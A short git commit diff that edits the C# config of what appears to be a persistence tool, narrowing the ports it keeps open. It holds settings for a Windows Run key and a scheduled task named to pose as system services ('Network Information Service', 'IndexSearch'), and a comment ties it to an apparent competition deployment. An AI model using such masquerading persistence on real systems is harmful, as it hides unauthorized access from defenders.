b2fbd2914a9ab4aef471e78bdbe3bead007cd0f2
WIll <will@dandrade.net>
2025-01-23 22:08:31 -0500

    Fixed ansible issues

--- Deployment/Configs/Config2/Config.cs
+++ Deployment/Configs/Config2/Config.cs
@@ -3,7 +3,7 @@ public class Config // This is for Binary 1
     public static bool Debugging { get; private set; } = false ; //Set to true for debugging messages and logs
     public static int sleepTime { get; private set; } = 40000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                                // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence
-    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 53, 5542 }; // Ports to keep open
+    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80}; // Ports to keep open
 
     public static string RunKeyName { get; private set; } = "Network Information Service";
     public static string ScheduledTaskName { get; private set; } = "IndexSearch";
